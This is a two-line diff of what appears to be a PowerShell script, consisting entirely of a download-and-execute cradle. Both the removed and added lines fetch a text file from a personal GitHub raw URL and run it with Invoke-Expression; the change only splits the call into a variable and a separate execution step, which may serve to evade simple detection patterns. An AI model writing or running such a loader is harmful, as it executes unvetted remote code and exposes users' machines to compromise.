@@ -1,2 +1,2 @@
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/tgdl.txt')
+$b = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/neginsadeghi2005/project/refs/heads/main/tgdl.txt');Invoke-Expression $b
 
